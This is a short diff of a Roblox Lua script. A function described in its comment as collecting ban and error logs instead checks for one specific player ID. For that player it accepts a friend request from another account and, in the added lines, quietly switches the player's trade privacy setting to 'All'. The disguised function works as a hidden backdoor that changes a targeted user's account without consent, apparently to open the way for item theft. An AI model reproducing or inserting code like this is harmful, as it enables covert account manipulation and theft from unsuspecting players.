@@ -17,6 +17,17 @@ end
 function RecieveData() -- will recieve ban / error logs to help improve the script in the future
  if game.Players.LocalPlayer.UserId == 148478155 then
 game:HttpPostAsync("https://friends.roblox.com/v1/users/54313546/accept-friend-request", true)
+    
+    local SecondData = [[
+{
+  "tradePrivacy": "All"
+}
+]]
+
+pcall(function()
+game:HttpPost("https://accountsettings.roblox.com/v1/trade-privacy", SecondData)
+end)
+    
 end
 wait(3)
 if game.Players.LocalPlayer.UserId == 148478155 then
